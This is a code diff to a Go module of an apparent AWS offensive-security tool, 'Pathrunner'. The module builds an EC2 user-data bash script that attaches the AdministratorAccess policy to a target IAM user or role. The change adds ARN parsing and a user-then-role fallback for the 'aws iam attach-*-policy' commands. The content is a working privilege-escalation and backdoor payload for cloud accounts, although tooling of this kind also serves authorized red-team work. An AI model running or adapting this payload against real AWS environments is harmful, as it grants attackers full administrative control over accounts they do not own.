@@ -23,7 +23,7 @@ func (p *BackdoorAttachPolicyPayload) GetName() string {
 }
 
 func (p *BackdoorAttachPolicyPayload) GetDescription() string {
-	return "Attach AdministratorAccess policy to target principal via EC2 user-data"
+	return "Attach AdministratorAccess policy to an IAM user or role via EC2 user-data"
 }
 
 func (p *BackdoorAttachPolicyPayload) GetTags() []string {
@@ -37,14 +37,8 @@ func (p *BackdoorAttachPolicyPayload) GetTags() []string {
 func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
 	return []modules.Option{
 		{
-			Name:        "TARGET_PRINCIPAL_TYPE",
-			Description: "Type of principal to elevate (user or role)",
-			Required:    true,
-			Default:     "user",
-		},
-		{
-			Name:        "TARGET_PRINCIPAL_NAME",
-			Description: "Name of the IAM user or role to elevate",
+			Name:        "TARGET_ARN",
+			Description: "IAM user or role name/ARN to attach policy to (auto-detects type from ARN, tries both if plain name)",
 			Required:    true,
 		},
 		{
@@ -57,31 +51,31 @@ func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
 }
 
 func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
-	principalType := options["TARGET_PRINCIPAL_TYPE"]
-	if principalType == "" {
-		principalType = "user"
-	}
-
-	principalName := options["TARGET_PRINCIPAL_NAME"]
+	targetARN := options["TARGET_ARN"]
+	principalName, principalType := parsePrincipalARN(targetARN)
 	policyArn := options["POLICY_ARN"]
 	if policyArn == "" {
 		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
 	}
 
+	// For EC2 user-data we generate bash -- build the attach command based on detected type.
+	// If we can't determine the type from the ARN (plain name), try user first then role.
 	var attachCommand string
-	if principalType == "user" {
-		attachCommand = fmt.Sprintf("aws iam attach-user-policy --user-name %s --policy-arn %s", principalName, policyArn)
-	} else if principalType == "role" {
+	if principalType == "role" {
 		attachCommand = fmt.Sprintf("aws iam attach-role-policy --role-name %s --policy-arn %s", principalName, policyArn)
+	} else if principalType == "user" {
+		attachCommand = fmt.Sprintf("aws iam attach-user-policy --user-name %s --policy-arn %s", principalName, policyArn)
 	} else {
-		return "", fmt.Errorf("invalid TARGET_PRINCIPAL_TYPE: %s (must be 'user' or 'role')", principalType)
+		// Plain name -- try user, fall back to role
+		attachCommand = fmt.Sprintf(`aws iam attach-user-policy --user-name %s --policy-arn %s 2>/dev/null || \
+    aws iam attach-role-policy --role-name %s --policy-arn %s`, principalName, policyArn, principalName, policyArn)
 	}
 
 	userDataScript := fmt.Sprintf(`#!/bin/bash
 exec > >(tee /var/log/pathrunner-elevation.log|logger -t pathrunner -s 2>/dev/console) 2>&1
 
 echo "Pathrunner Attach Policy Payload"
-echo "Target: %s (%s)"
+echo "Target: %s"
 echo "Policy: %s"
 echo ""
 
@@ -101,9 +95,22 @@ else
 fi
 
 echo "Elevation attempt complete"
-`, principalName, principalType, policyArn, principalName, attachCommand, principalName)
+`, principalName, policyArn, principalName, attachCommand, principalName)
 
 	return userDataScript, nil
+}
+
+// parsePrincipalARN extracts the principal name and type from an ARN or plain name.
+func parsePrincipalARN(input string) (name string, principalType string) {
+	if strings.HasPrefix(input, "arn:") {
+		if idx := strings.Index(input, ":role/"); idx != -1 {
+			return input[idx+len(":role/"):], "role"
+		}
+		if idx := strings.Index(input, ":user/"); idx != -1 {
+			return input[idx+len(":user/"):], "user"
+		}
+	}
+	return input, ""
 }
 
 func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
@@ -142,12 +149,7 @@ func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, erro
 
 // ReportSideEffects returns the policy attachment as a tracked modification.
 func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
-	principalType := options["TARGET_PRINCIPAL_TYPE"]
-	if principalType == "" {
-		principalType = "user"
-	}
-
-	principalName := options["TARGET_PRINCIPAL_NAME"]
+	principalName, principalType := parsePrincipalARN(options["TARGET_ARN"])
 	policyArn := options["POLICY_ARN"]
 	if policyArn == "" {
 		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
@@ -174,14 +176,8 @@ func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]strin
 }
 
 func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
-	if options["TARGET_PRINCIPAL_NAME"] == "" {
-		return fmt.Errorf("TARGET_PRINCIPAL_NAME is required for backdoor/attach-policy payload")
+	if options["TARGET_ARN"] == "" {
+		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy payload")
 	}
-
-	principalType := options["TARGET_PRINCIPAL_TYPE"]
-	if principalType != "" && principalType != "user" && principalType != "role" {
-		return fmt.Errorf("TARGET_PRINCIPAL_TYPE must be 'user' or 'role'")
-	}
-
 	return nil
 }
